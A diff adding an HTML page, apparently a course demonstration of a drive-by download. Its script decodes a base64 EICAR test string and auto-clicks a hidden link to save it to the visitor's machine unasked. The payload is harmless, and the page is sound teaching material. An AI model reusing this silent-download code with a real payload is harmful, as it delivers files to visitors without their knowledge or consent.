@@ -1,0 +1,41 @@
+<body>
+    <script>
+        filename = "IT166.com"
+        filedata = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="
+
+
+        function base64tobytes(base64data){
+            var binaryValues = atob(base64data);
+            var binaryLength = binaryValues.length
+            var bytesData = new Uint8Array(binaryLength);
+
+            for ( var i = 0; i < binaryLength; i++){
+                bytesData[i] = binaryValues.charCodeAt(i);
+            }
+
+            return bytesData.buffer;
+        }
+
+
+        var fileBytes = base64tobytes(filedata); 
+        var blob = new Blob([fileBytes], {"type":"octet/stream"});
+
+        var anchor = document.createElement("a");
+        document.body.append(anchor);
+        // we can hide the anchor by using some basic CSS
+        anchor.style = "display: None;"
+
+        var url = window.URL.createObjectURL(blob);
+        anchor.href = url;
+        anchor.download = filename;
+
+        anchor.click();
+        window.URL.revokeObjectURL(url);
+    </script>
+    <h1>For IT166 Research Purposes:</h1>
+    <h1>Drive-by Download Simulation</h1>
+
+    <p>It's possible that a IT166.exe file has been downloaded by your browser without you knowing...</p>
+    <p>Rest assured, the downloaded file is not malicious but just a testing file</p>
+
+</body>
